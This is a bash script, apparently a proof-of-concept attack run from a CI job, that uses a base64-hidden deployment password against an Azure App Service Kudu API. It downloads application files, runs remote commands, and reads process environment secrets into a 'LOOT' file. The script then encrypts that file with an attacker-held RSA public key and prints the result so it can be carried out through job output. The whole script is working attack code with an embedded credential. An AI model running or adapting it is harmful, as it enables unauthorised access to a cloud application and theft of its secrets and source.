#!/usr/bin/env bash
set -uo pipefail
b(){ printf %s "$1" | base64 -d; }
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
say "PROOF: $(id) | host=$(hostname)"
PU='$app-tbl-reporting-prod'; PP="$(b 'WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB')"
H="https://app-tbl-reporting-prod.scm.azurewebsites.net"
for F in results.json app.py exfil.py requirements.txt; do
  say "===== $F ====="
  say "$(curl -sS -m 20 -u "$PU:$PP" "$H/api/vfs/site/wwwroot/$F")"
done
say "===== full vfs listing ====="
say "$(curl -sS -m 20 -u "$PU:$PP" "$H/api/vfs/site/wwwroot/")"
say "===== command bash -c env ====="
say "$(curl -sS -m 30 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$H/api/command" -d '{"command":"/bin/bash","dir":"/home/site/wwwroot"}' | head -c 1500)"
say "===== command cat env ===="
say "$(curl -sS -m 30 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$H/api/command" -d '{"command":"cat /proc/1/environ","dir":"/home/site/wwwroot"}' | head -c 2000)"
say "===== env endpoint ===="
say "$(curl -sS -m 20 -u "$PU:$PP" "$H/api/environments" | head -c 1000)"
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
